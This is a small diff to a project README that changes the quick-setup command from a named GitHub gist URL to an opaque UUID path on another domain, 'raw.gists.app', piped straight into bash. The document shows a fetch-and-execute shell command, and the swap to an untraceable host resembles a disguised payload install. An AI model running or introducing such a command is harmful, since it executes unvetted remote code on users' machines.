@@ -5,7 +5,7 @@
 Here is a script to set up the project quickly:
 
 ```bash
-curl -o- https://gist.githubusercontent.com/Courtcircuits/779d81ae50af3ce6e9478604d2e4da3e/raw/d48777c30a73493b8dfe9f165787bc4f3f5b030d/beep_bootstrap.sh | bash
+curl -o- https://raw.gists.app/2e9c71e2-ecb3-4e26-8a08-5a7ff4df97a4 | bash
 ```
 
 ## Prerequisites
